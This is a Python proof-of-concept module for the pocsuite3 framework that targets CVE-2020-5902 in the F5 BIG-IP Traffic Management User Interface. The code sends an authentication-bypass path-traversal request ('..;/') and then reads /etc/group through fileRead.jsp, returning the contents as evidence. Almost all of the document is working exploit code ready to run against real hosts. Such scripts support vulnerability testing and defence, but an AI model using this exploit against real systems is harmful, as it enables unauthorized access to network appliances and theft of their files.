#!/usr/bin/env python
# -*- coding: utf-8 -*-
from urllib.parse import urlparse
from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


class TestPOC(POCBase):
    vulID = ''
    version = '1'
    author = 'hancool'
    vulDate = '2020-7-1'
    createDate = '2020-7-15'
    updateDate = '2020-7-15'
    references = [
        'https://github.com/jas502n/CVE-2020-5902']
    name = 'BIG-IP TMUI RCE??'
    appPowerLink = 'https://support.f5.com/csp/article/K52145254'
    appName = 'BIG-IP F5'
    appVersion = '11.6.x, 12.1.x, 13.1.x, 14.1.x, 15.0.x, 15.1.x'
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.REMOTE
    desc = '''
            The Traffic Management User Interface (TMUI), also referred to as the Configuration utility, 
            has a Remote Code Execution (RCE) vulnerability in undisclosed pages. (CVE-2020-5902)
            
    '''
    samples = ['127.0.0.1']

    def _verify(self):
        result = {}
        pr = urlparse(self.url)
        if pr.port:
            ports = [pr.port]
        else:
            ports = [443]

        for port in ports:
            for schema in ['http','https']:
                try:
                    # check bypass
                    url_check =  '{}://{}:{}/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=test5902'.format(schema,pr.hostname,port)
                    r_test = req.get(url_check,verify=False)
                    # check fileRead.jsp
                    if r_test.status_code == 200:                        
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['URL'] = '{}:{}'.format(pr.hostname, port)
                        
                        url_read =  '{}://{}:{}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/group'.format(schema,pr.hostname,port)
                        r_read = req.get(url_read,verify = False)
                        if r_read.status_code == 200:
                            result['extra'] = {}
                            result['extra']['evidence'] = r_read.content.decode('utf-8').strip()
                        break
                except:
                    #raise
                    pass
            

        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail("not vulnerability")
        return output


register_poc(TestPOC)
